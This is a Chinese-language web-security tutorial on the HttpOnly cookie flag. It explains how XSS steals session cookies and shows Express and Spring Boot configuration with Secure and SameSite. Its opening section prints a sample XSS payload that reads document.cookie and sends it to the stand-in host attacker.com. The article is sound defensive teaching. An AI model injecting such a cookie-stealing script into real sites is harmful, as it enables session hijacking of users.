# HttpOnly Cookie
---
在 Web 开发中，我们常说「安全无小事」。但你是否想过，一个看似普通的 Cookie，可能成为黑客窃取用户身份的「钥匙」？

2002 年，微软在 IE6 中首次引入了一个不起眼的 Cookie 属性——`HttpOnly`。这个属性的诞生，彻底改变了客户端脚本与 Cookie 的交互规则，为防范跨站脚本攻击（XSS）筑起了一道关键防线。

## 一、为什么需要 HttpOnly Cookie？

要理解 HttpOnly 的价值，得先回到 Web 安全的经典威胁——**跨站脚本攻击（XSS）​**。

### 场景还原：XSS 如何窃取 Cookie？

假设某电商网站的用户登录后，服务器返回一个包含会话 ID 的 Cookie：

```
Set-Cookie: sessionId=abc123; Path=/; 
```

此时，若页面存在 XSS 漏洞（例如用户评论区未过滤恶意脚本），攻击者可以注入一段 JavaScript：

```
// 恶意脚本通过 document.cookie 窃取 Cookie
var cookie = document.cookie; 
// 发送到攻击者服务器
new Image().src = 'https://attacker.com/?data=' + encodeURIComponent(cookie);
```

这段代码会明文读取用户的 `sessionId`，并通过图片请求发送给攻击者。攻击者拿到会话 ID 后，就能冒充用户身份操作账户——这就是典型的「会话劫持」。

### 传统 Cookie 的缺陷：脚本可随意访问

普通 Cookie 的设计缺陷在于：​**客户端脚本（如 JavaScript）可以通过 `document.cookie` 接口自由读写 Cookie**。这原本是为了方便前端业务（例如记住用户偏好），但在 XSS 攻击面前，却成了致命漏洞。

## 二、HttpOnly Cookie 的核心机制

HttpOnly Cookie 的本质是**通过协议层约束，禁止客户端脚本访问敏感 Cookie**。它由服务器在响应头 `Set-Cookie` 中声明，浏览器会强制实施这一规则。

### 1. 如何声明 HttpOnly Cookie？

服务器只需在 `Set-Cookie` 头部添加 `HttpOnly` 标志即可。示例：

```
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

* `HttpOnly`：声明该 Cookie 仅限 HTTP(S) 协议层面使用，禁止任何客户端脚本（包括 JavaScript）通过 `document.cookie` 访问。
* 其他常见标志（如 `Secure`、`SameSite`）：与 HttpOnly 配合使用，进一步增强安全性（后文详述）。

### 2. 浏览器如何处理 HttpOnly Cookie？

当浏览器收到带有 `HttpOnly` 标志的 Cookie 时，会将其存储在一个**受保护的隔离区域**中。前端代码通过 `document.cookie` 只能访问非 HttpOnly 的 Cookie，而 HttpOnly Cookie 对脚本「完全不可见」。

举个例子：

* 普通 Cookie：`userToken=xyz`（可通过 `document.cookie` 读取）。
* HttpOnly Cookie：`sessionId=abc123; HttpOnly`（`document.cookie` 返回空字符串）。

### 3. 防御 XSS 的底层逻辑

即使页面被注入恶意脚本，攻击者也无法通过 `document.cookie` 窃取 HttpOnly Cookie。这意味着，XSS 攻击最多只能获取页面中明文存储的其他数据（如用户输入的内容），但无法拿到关键的会话凭证，会话劫持的风险被大幅降低。

## 三、实战：如何正确设置 HttpOnly Cookie？

### 1. 服务端设置示例

不同后端语言的实现方式类似，核心是在响应头中添加 `HttpOnly` 标志。

#### Node.js（Express）：

```
res.cookie('sessionId', 'abc123', { 
  httpOnly: true,  // 启用 HttpOnly
  secure: process.env.NODE_ENV === 'production',  // 生产环境强制 HTTPS
  sameSite: 'lax'  // 防御 CSRF
});
```

#### Java（Spring Boot）：

```
ResponseCookie cookie = ResponseCookie.from("sessionId", "abc123")
    .httpOnly(true)  // 启用 HttpOnly
    .secure(true)    // 生产环境强制 HTTPS
    .sameSite("Lax") // 防御 CSRF
    .path("/")       // 生效路径
    .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

### 2. 注意事项

* ​**必须配合 HTTPS**​：`HttpOnly` 不限制 Cookie 的传输方式，若网站使用 HTTP，Cookie 可能在传输中被中间人窃取。因此，需同时启用 `Secure` 标志（仅 HTTPS 传输）。
* ​**不影响服务端操作**​：服务端仍可通过请求头 `Cookie` 正常读取 HttpOnly Cookie（例如验证会话），这一特性对业务逻辑无感知。

## 四、HttpOnly 与其他安全属性的协同

HttpOnly 并非「万能药」，需与其他 Cookie 属性配合，才能构建完整的安全体系。

### 1. Secure：传输层加密

`Secure` 标志强制 Cookie 仅在 HTTPS 连接下传输，防止中间人在网络层窃取 Cookie。它与 HttpOnly 是「互补关系」：HttpOnly 防止脚本窃取，Secure 防止传输窃取。

### 2. SameSite：跨站请求防护

`SameSite` 控制 Cookie 是否随跨站请求发送，可防范 CSRF（跨站请求伪造）攻击。例如：

* `SameSite=Strict`：仅在同站请求中发送 Cookie（最严格，但可能影响用户体验）。
* `SameSite=Lax`（默认推荐）：允许部分安全的跨站请求（如 GET 导航），阻止危险操作（如 POST 提交）。

### 3. 组合策略示例

一个安全的 Cookie 配置应包含：

```
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

## 五、局限性与最佳实践

### 1. HttpOnly 的边界

* ​**无法防御所有攻击**​：HttpOnly 能阻止 XSS 窃取 Cookie，但无法防御 XSS 执行的其他恶意操作（如修改页面内容、钓鱼攻击）。
* ​**不防 CSRF**​：CSRF 攻击的本质是「伪造用户请求」，即使 Cookie 是 HttpOnly，只要请求携带 Cookie（同站），仍可能被利用（需配合 SameSite 或 CSRF Token 防御）。

### 2. 最佳实践

* ​**敏感 Cookie 强制 HttpOnly**​：所有与会话、身份相关的 Cookie（如 `sessionId`、`token`）必须声明 `HttpOnly`。
* ​**最小化 Cookie 作用域**​：通过 `Path` 和 `Domain` 限制 Cookie 的生效范围（例如仅限 `/api` 路径），减少泄露风险。
* ​**定期轮换会话 ID**​：即使 Cookie 被窃取，短时效的会话 ID 能降低攻击窗口（可结合 `Max-Age` 或 `Expires`控制过期时间）。

## 总结

HttpOnly Cookie 是 Web 安全史上的一个关键创新，它通过协议层的约束，将敏感 Cookie 与客户端脚本隔离，为防范 XSS 攻击提供了「最后一道防线」。

但安全没有「银弹」——HttpOnly 需与 HTTPS、SameSite、CSRF Token 等机制配合，才能构建真正的安全体系。作为开发者，我们应当将其作为默认实践，在每一个需要身份验证的 Cookie 上打上 `HttpOnly` 的标记，让用户的会话凭证更安全一点。

毕竟，安全的本质，是用最小的代价，防范最大的风险。
